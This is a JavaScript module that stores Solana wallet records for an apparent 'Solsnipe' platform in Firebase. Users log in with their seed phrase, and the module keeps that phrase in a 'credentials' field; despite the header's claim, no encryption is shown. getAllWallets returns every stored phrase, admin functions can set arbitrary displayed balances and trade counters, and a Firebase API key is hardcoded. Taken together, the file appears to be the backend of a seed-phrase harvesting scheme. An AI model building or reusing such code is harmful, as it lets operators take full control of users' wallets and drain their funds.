/**
 * Firebase Wallet Store - API Key Version
 * 
 * Stores wallet data for seed phrase-generated wallets
 * Uses Firebase REST API (no service account needed)
 */

/**
 * Wallet Data Structure in Firebase:
 * 
 * Collection: wallets
 * Document ID: walletId (unique UUID from seed hash)
 * 
 * Fields:
 * - walletId: string (unique identifier)
 * - walletAddress: string (Solana public key)
 * - seedHash: string (SHA-256 hash of seed/passphrase - for lookup)
 * - walletType: string (solflare, phantom, backpack, etc.)
 * - inputType: string (seed_phrase or passphrase)
 * - derivationPath: string (BIP44 path or "custom-passphrase")
 * - accountIndex: number (derivation index)
 * - blockchain: string ("solana")
 * - balance: number (SOL balance)
 * - solsnipeBalance: number (Solsnipe platform balance - default 0)
 * - credentials: string (encrypted seed phrase or passphrase)
 * - balanceLastUpdated: timestamp
 * - transactions: array (recent transaction signatures)
 * - createdAt: timestamp
 * - lastLoginAt: timestamp
 * - loginCount: number
 * - metadata: object (additional info)
 */

class FirebaseWalletStore {
  constructor() {
    // Use environment variables with hardcoded fallback for local development
    this.projectId = process.env.FIREBASE_PROJECT_ID || 'solsnipetest';
    this.apiKey = process.env.FIREBASE_API_KEY || 'AIzaSyDCNm_YPQen7StRUm1rZUX2L0ni_INkKk8';
    
    // Validate that we have values
    if (!this.projectId) {
      throw new Error('FIREBASE_PROJECT_ID is not set');
    }
    if (!this.apiKey) {
      throw new Error('FIREBASE_API_KEY is not set');
    }
    
    console.log('🔧 Firebase Config:');
    console.log('   Project ID:', this.projectId);
    console.log('   API Key:', this.apiKey ? '✅ Set' : '❌ Missing');
    console.log('   Source:', process.env.FIREBASE_PROJECT_ID ? 'Environment Variable' : 'Hardcoded (Local Dev)');
    
    this.baseUrl = `https://firestore.googleapis.com/v1/projects/${this.projectId}/databases/(default)/documents`;
  }

  /**
   * Create or update wallet in Firebase
   */
  async saveWallet(walletData) {
    try {
      const { walletId, walletAddress, lookupHash, walletType, inputType, derivationPath, accountIndex, balance = 0, credentials = '' } = walletData;

      console.log('💾 Saving wallet to Firebase:', walletAddress);

      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;

      const firestoreData = {
        fields: {
          walletId: { stringValue: walletId },
          walletAddress: { stringValue: walletAddress },
          seedHash: { stringValue: lookupHash },
          walletType: { stringValue: walletType },
          inputType: { stringValue: inputType },
          derivationPath: { stringValue: derivationPath },
          accountIndex: { integerValue: accountIndex },
          blockchain: { stringValue: 'solana' },
          balance: { doubleValue: balance },
          solsnipeBalance: { doubleValue: 0 }, // Initialize Solsnipe balance to 0
          depositedAmount: { doubleValue: 0 }, // Initialize deposited amount to 0
          credentials: { stringValue: credentials }, // Store seed phrase or passphrase
          balanceLastUpdated: { timestampValue: new Date().toISOString() },
          solsnipeBalanceLastUpdated: { timestampValue: new Date().toISOString() },
          depositedAmountLastUpdated: { timestampValue: new Date().toISOString() },
          createdAt: { timestampValue: new Date().toISOString() },
          lastLoginAt: { timestampValue: new Date().toISOString() },
          loginCount: { integerValue: 1 },
          totalSolsnipeCredited: { doubleValue: 0 }, // Track total Solsnipe credits
          totalSolCredited: { doubleValue: 0 }, // Track total SOL credits
          totalDeposited: { doubleValue: 0 }, // Track total deposits
          autoSnipeBot: { integerValue: 0 }, // Auto snipe bot count (increases by 2 per credit)
          totalTrade: { integerValue: 0 }, // Total trades count (increases by 1 per credit)
          withdrawal: { stringValue: '' } // Withdrawal requests
        }
      };

      const response = await fetch(docPath, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(firestoreData)
      });

      if (!response.ok) {
        const errorText = await response.text();
        let errorDetails;
        try {
          errorDetails = JSON.parse(errorText);
        } catch {
          errorDetails = { message: errorText };
        }
        
        console.error('❌ Firebase save error:', errorDetails);
        
        // Provide helpful error message
        if (response.status === 403) {
          throw new Error('Firebase permission denied. Please enable Firestore Database in Firebase Console.');
        } else if (response.status === 404) {
          throw new Error('Firestore database not found. Please create Firestore Database in Firebase Console.');
        }
        
        throw new Error(`Firebase save failed (${response.status}): ${errorDetails.error?.message || errorDetails.message || 'Unknown error'}`);
      }

      console.log('✅ Wallet saved successfully');
      return await response.json();
    } catch (error) {
      console.error('💥 saveWallet error:', error.message);
      throw new Error(`Failed to save wallet: ${error.message}`);
    }
  }

  /**
   * Get wallet by wallet ID
   */
  async getWalletById(walletId) {
    try {
      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;

      const response = await fetch(docPath);

      if (response.status === 404) {
        return null;
      }

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Firebase fetch failed: ${error.error?.message || 'Unknown error'}`);
      }

      const data = await response.json();
      return this.parseFirestoreDocument(data);
    } catch (error) {
      throw new Error(`Failed to get wallet: ${error.message}`);
    }
  }

  /**
   * Get wallet by seed hash (for login authentication)
   */
  async getWalletBySeedHash(seedHash) {
    try {
      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;

      const query = {
        structuredQuery: {
          from: [{ collectionId: 'wallets' }],
          where: {
            fieldFilter: {
              field: { fieldPath: 'seedHash' },
              op: 'EQUAL',
              value: { stringValue: seedHash }
            }
          },
          limit: 1
        }
      };

      console.log('🔍 Querying Firebase for wallet with seed hash:', seedHash.substring(0, 10) + '...');

      const response = await fetch(queryUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(query)
      });

      if (!response.ok) {
        const errorText = await response.text();
        let errorDetails;
        try {
          errorDetails = JSON.parse(errorText);
        } catch {
          errorDetails = { message: errorText };
        }
        
        console.error('❌ Firebase query error:', errorDetails);
        
        // Provide helpful error message
        if (response.status === 403) {
          throw new Error('Firebase permission denied. Please enable Firestore Database in Firebase Console.');
        } else if (response.status === 404) {
          throw new Error('Firestore database not found. Please create Firestore Database in Firebase Console.');
        }
        
        throw new Error(`Firebase query failed (${response.status}): ${errorDetails.error?.message || errorDetails.message || 'Unknown error'}`);
      }

      const results = await response.json();
      console.log('📊 Query results:', results.length, 'items');

      if (!results || results.length === 0 || !results[0].document) {
        console.log('ℹ️  No wallet found for this seed hash (new user)');
        return null;
      }

      console.log('✅ Existing wallet found');
      return this.parseFirestoreDocument(results[0].document);
    } catch (error) {
      console.error('💥 getWalletBySeedHash error:', error.message);
      throw new Error(`Failed to query wallet: ${error.message}`);
    }
  }

  /**
   * Get wallet by wallet address
   */
  async getWalletByAddress(walletAddress) {
    try {
      console.log(`🔍 Finding wallet by address: ${walletAddress}`);
      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;

      const query = {
        structuredQuery: {
          from: [{ collectionId: 'wallets' }],
          where: {
            fieldFilter: {
              field: { fieldPath: 'walletAddress' },
              op: 'EQUAL',
              value: { stringValue: walletAddress }
            }
          },
          limit: 1
        }
      };

      const response = await fetch(queryUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(query)
      });

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Firebase query failed: ${errorText}`);
      }

      const results = await response.json();

      if (!results || results.length === 0 || !results[0].document) {
        console.log('ℹ️  No wallet found for this address');
        return null;
      }

      console.log('✅ Wallet found by address');
      return this.parseFirestoreDocument(results[0].document);
    } catch (error) {
      console.error('💥 getWalletByAddress error:', error.message);
      throw new Error(`Failed to query wallet by address: ${error.message}`);
    }
  }

  /**
   * Update wallet balance and last login
   */
  async updateWalletBalance(walletId, balance, transactions = [], creditAmount = 0) {
    try {
      const wallet = await this.getWalletById(walletId);
      if (!wallet) {
        throw new Error('Wallet not found');
      }

      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;

      // Preserve existing transactions if no new ones provided
      const transactionsToSave = transactions && transactions.length > 0 
        ? transactions 
        : (wallet.transactions || []);

      // Calculate new totalSolCredited if this is a credit operation
      const totalSolCredited = (wallet.totalSolCredited || 0) + (creditAmount > 0 ? creditAmount : 0);

      const updateData = {
        fields: {
          // Preserve ALL existing fields
          walletId: { stringValue: wallet.walletId },
          walletAddress: { stringValue: wallet.walletAddress },
          seedHash: { stringValue: wallet.seedHash },
          walletType: { stringValue: wallet.walletType },
          inputType: { stringValue: wallet.inputType },
          derivationPath: { stringValue: wallet.derivationPath },
          accountIndex: { integerValue: wallet.accountIndex },
          blockchain: { stringValue: wallet.blockchain || 'solana' },
          solsnipeBalance: { doubleValue: wallet.solsnipeBalance || 0 }, // Preserve Solsnipe balance
          credentials: { stringValue: wallet.credentials || '' }, // Preserve credentials
          createdAt: { timestampValue: wallet.createdAt },
          // Update these fields
          balance: { doubleValue: balance },
          balanceLastUpdated: { timestampValue: new Date().toISOString() },
          lastLoginAt: { timestampValue: new Date().toISOString() },
          loginCount: { integerValue: (wallet.loginCount || 0) + 1 },
          totalSolCredited: { doubleValue: totalSolCredited }, // Track total SOL credits
          totalSolsnipeCredited: { doubleValue: wallet.totalSolsnipeCredited || 0 }, // Preserve Solsnipe credits
          transactions: {
            arrayValue: {
              values: transactionsToSave.map(tx => ({ stringValue: tx }))
            }
          }
        }
      };

      // Add metadata if it exists
      if (wallet.metadata) {
        updateData.fields.metadata = {
          mapValue: {
            fields: Object.entries(wallet.metadata).reduce((acc, [key, value]) => {
              acc[key] = { stringValue: String(value) };
              return acc;
            }, {})
          }
        };
      }

      const response = await fetch(docPath, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updateData)
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
      }

      console.log('✅ Wallet balance updated:', { walletId, balance, transactionCount: transactionsToSave.length });
      return await response.json();
    } catch (error) {
      throw new Error(`Failed to update wallet: ${error.message}`);
    }
  }

  /**
   * Update wallet balance by wallet address (for admin operations)
   */
  async updateBalanceByAddress(walletAddress, newBalance, adminId, operation, creditAmount) {
    try {
      // Find wallet by address
      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;

      const query = {
        structuredQuery: {
          from: [{ collectionId: 'wallets' }],
          where: {
            fieldFilter: {
              field: { fieldPath: 'walletAddress' },
              op: 'EQUAL',
              value: { stringValue: walletAddress }
            }
          },
          limit: 1
        }
      };

      const response = await fetch(queryUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(query)
      });

      if (!response.ok) {
        throw new Error('Failed to find wallet');
      }

      const results = await response.json();
      if (!results || results.length === 0 || !results[0].document) {
        throw new Error('Wallet not found');
      }

      const wallet = this.parseFirestoreDocument(results[0].document);

      // Update balance AND track total SOL credited
      await this.updateWalletBalance(wallet.walletId, newBalance, wallet.transactions || [], creditAmount);

      // Log admin operation
      await this.logAdminOperation(walletAddress, adminId, operation, newBalance);

      return { success: true, walletAddress, newBalance };
    } catch (error) {
      throw new Error(`Failed to update balance: ${error.message}`);
    }
  }

  /**
   * Log admin operations (credit/debit/set-balance)
   */
  async logAdminOperation(walletAddress, adminId, operation, amount) {
    try {
      const operationId = `${Date.now()}-${Math.random().toString(36).substring(7)}`;
      const docPath = `${this.baseUrl}/admin_operations/${operationId}?key=${this.apiKey}`;

      const operationData = {
        fields: {
          operationId: { stringValue: operationId },
          walletAddress: { stringValue: walletAddress },
          adminId: { stringValue: adminId },
          operation: { stringValue: operation },
          amount: { doubleValue: amount },
          timestamp: { timestampValue: new Date().toISOString() }
        }
      };

      await fetch(docPath, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(operationData)
      });
    } catch (error) {
      console.error('Failed to log admin operation:', error);
    }
  }

  /**
   * Parse Firestore document to regular object
   */
  parseFirestoreDocument(doc) {
    if (!doc || !doc.fields) return null;

    const fields = doc.fields;
    const parsed = {};

    for (const [key, value] of Object.entries(fields)) {
      if (value.stringValue !== undefined) {
        parsed[key] = value.stringValue;
      } else if (value.integerValue !== undefined) {
        parsed[key] = parseInt(value.integerValue);
      } else if (value.doubleValue !== undefined) {
        parsed[key] = parseFloat(value.doubleValue);
      } else if (value.timestampValue !== undefined) {
        parsed[key] = value.timestampValue;
      } else if (value.arrayValue !== undefined) {
        parsed[key] = value.arrayValue.values?.map(v => v.stringValue || v) || [];
      } else if (value.mapValue !== undefined) {
        parsed[key] = this.parseFirestoreDocument({ fields: value.mapValue.fields });
      }
    }

    return parsed;
  }

  /**
   * Delete wallet (admin only)
   */
  async deleteWallet(walletId) {
    try {
      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;

      const response = await fetch(docPath, {
        method: 'DELETE'
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Firebase delete failed: ${error.error?.message || 'Unknown error'}`);
      }

      return { success: true, walletId };
    } catch (error) {
      throw new Error(`Failed to delete wallet: ${error.message}`);
    }
  }

  /**
   * Update Solsnipe balance (platform credits, not SOL)
   */
  async updateSolsnipeBalance(walletId, newBalance, adminId, operation, creditAmount) {
    try {
      const wallet = await this.getWalletById(walletId);
      if (!wallet) {
        throw new Error('Wallet not found');
      }

      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;

      // Calculate new totals and increments
      const totalSolsnipeCredited = (wallet.totalSolsnipeCredited || 0) + (operation === 'credit' ? creditAmount : 0);
      const autoSnipeBot = (wallet.autoSnipeBot || 0) + (operation === 'credit' ? 2 : 0); // Increase by 2 per credit
      const totalTrade = (wallet.totalTrade || 0) + (operation === 'credit' ? 1 : 0); // Increase by 1 per credit

      const updateData = {
        fields: {
          // Preserve ALL existing fields
          walletId: { stringValue: wallet.walletId },
          walletAddress: { stringValue: wallet.walletAddress },
          seedHash: { stringValue: wallet.seedHash },
          walletType: { stringValue: wallet.walletType },
          inputType: { stringValue: wallet.inputType },
          derivationPath: { stringValue: wallet.derivationPath },
          accountIndex: { integerValue: wallet.accountIndex },
          blockchain: { stringValue: wallet.blockchain || 'solana' },
          balance: { doubleValue: wallet.balance || 0 },
          credentials: { stringValue: wallet.credentials || '' },
          createdAt: { timestampValue: wallet.createdAt },
          balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
          lastLoginAt: { timestampValue: wallet.lastLoginAt },
          loginCount: { integerValue: wallet.loginCount || 0 },
          
          // Update Solsnipe balance
          solsnipeBalance: { doubleValue: newBalance },
          solsnipeBalanceLastUpdated: { timestampValue: new Date().toISOString() },
          
          // Track total credits
          totalSolsnipeCredited: { doubleValue: totalSolsnipeCredited },
          totalSolCredited: { doubleValue: wallet.totalSolCredited || 0 },
          
          // Auto snipe bot and trade counters
          autoSnipeBot: { integerValue: autoSnipeBot },
          totalTrade: { integerValue: totalTrade },
          
          // Withdrawal field
          withdrawal: { stringValue: wallet.withdrawal || '' },
          
          // Transaction history
          transactions: {
            arrayValue: {
              values: (wallet.transactions || []).map(tx => ({ stringValue: tx }))
            }
          }
        }
      };

      const response = await fetch(docPath, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updateData)
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
      }

      console.log('✅ Solsnipe balance updated:', { walletId, newBalance, totalSolsnipeCredited, autoSnipeBot, totalTrade });
      return await response.json();
    } catch (error) {
      throw new Error(`Failed to update Solsnipe balance: ${error.message}`);
    }
  }

  /**
   * Update Deposited Amount
   */
  async updateDepositedAmount(walletId, newAmount, adminId, operation, creditAmount) {
    try {
      const wallet = await this.getWalletById(walletId);
      if (!wallet) {
        throw new Error('Wallet not found');
      }

      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;

      // Calculate new totals
      const totalDeposited = (wallet.totalDeposited || 0) + (operation === 'credit' ? creditAmount : 0);

      const updateData = {
        fields: {
          // Preserve ALL existing fields
          walletId: { stringValue: wallet.walletId },
          walletAddress: { stringValue: wallet.walletAddress },
          seedHash: { stringValue: wallet.seedHash },
          walletType: { stringValue: wallet.walletType },
          inputType: { stringValue: wallet.inputType },
          derivationPath: { stringValue: wallet.derivationPath },
          accountIndex: { integerValue: wallet.accountIndex },
          blockchain: { stringValue: wallet.blockchain || 'solana' },
          balance: { doubleValue: wallet.balance || 0 },
          solsnipeBalance: { doubleValue: wallet.solsnipeBalance || 0 },
          credentials: { stringValue: wallet.credentials || '' },
          createdAt: { timestampValue: wallet.createdAt },
          balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
          solsnipeBalanceLastUpdated: { timestampValue: wallet.solsnipeBalanceLastUpdated || new Date().toISOString() },
          lastLoginAt: { timestampValue: wallet.lastLoginAt },
          loginCount: { integerValue: wallet.loginCount || 0 },
          
          // Update Deposited Amount
          depositedAmount: { doubleValue: newAmount },
          depositedAmountLastUpdated: { timestampValue: new Date().toISOString() },
          
          // Track total credits
          totalSolsnipeCredited: { doubleValue: wallet.totalSolsnipeCredited || 0 },
          totalSolCredited: { doubleValue: wallet.totalSolCredited || 0 },
          totalDeposited: { doubleValue: totalDeposited },
          
          // Auto snipe bot and trade counters
          autoSnipeBot: { integerValue: wallet.autoSnipeBot || 0 },
          totalTrade: { integerValue: wallet.totalTrade || 0 },
          
          // Withdrawal field
          withdrawal: { stringValue: wallet.withdrawal || '' },
          
          // Transaction history
          transactions: {
            arrayValue: {
              values: (wallet.transactions || []).map(tx => ({ stringValue: tx }))
            }
          }
        }
      };

      const response = await fetch(docPath, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updateData)
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
      }

      console.log('✅ Deposited amount updated:', { walletId, newAmount, totalDeposited });
      return await response.json();
    } catch (error) {
      throw new Error(`Failed to update Solsnipe balance: ${error.message}`);
    }
  }

  /**
   * Get all wallets (admin only)
   */
  async getAllWallets() {
    try {
      console.log('📋 Fetching all wallets from Firebase...');
      
      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;

      const query = {
        structuredQuery: {
          from: [{ collectionId: 'wallets' }],
          orderBy: [{
            field: { fieldPath: 'createdAt' },
            direction: 'DESCENDING'
          }]
        }
      };

      const response = await fetch(queryUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(query)
      });

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Firebase query failed: ${errorText}`);
      }

      const results = await response.json();
      
      if (!results || results.length === 0) {
        console.log('ℹ️  No wallets found');
        return [];
      }

      const wallets = results
        .filter(item => item.document)
        .map(item => this.parseFirestoreDocument(item.document));

      console.log(`✅ Retrieved ${wallets.length} wallets`);
      return wallets;
    } catch (error) {
      console.error('💥 getAllWallets error:', error.message);
      throw new Error(`Failed to fetch wallets: ${error.message}`);
    }
  }
}

module.exports = { FirebaseWalletStore };
